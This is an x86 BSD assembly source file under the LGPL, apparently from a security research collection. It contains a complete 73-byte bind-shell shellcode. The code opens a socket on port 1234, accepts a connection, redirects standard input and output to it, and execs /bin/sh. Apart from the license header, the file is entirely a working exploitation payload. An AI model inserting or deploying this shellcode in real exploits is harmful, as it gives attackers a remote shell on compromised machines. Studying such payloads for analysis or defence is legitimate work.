/*
 *  bsd-x86-bndsockcode.s
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.global _start

_start:

# 73 bytes

bndsockcode:
    xorl    %eax,%eax
    pushl   %eax
    pushl   $0xd20402ff
    movl    %esp,%edi

    pushl   %eax
    pushl   $0x01
    pushl   $0x02
    pushl   $0x10
    movb    $0x61,%al
    int     $0x80

    pushl   %edi
    pushl   %eax
    pushl   %eax
    pushl   $0x68
    popl    %eax
    int     $0x80

    movl    %eax,-0x14(%edi)
    movb    $0x6a,%al
    int     $0x80

    movb    $0x1e,%al
    int     $0x80

    pushl   %eax
    pushl   %eax

0:
    pushl   $0x5a
    popl    %eax
    int     $0x80

    decl    -0x1c(%edi)
    jns     0b

shellcode:
#    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %esp
    pushl   %ebx
    pushl   %eax
    movb    $0x3b,%al
    int     $0x80

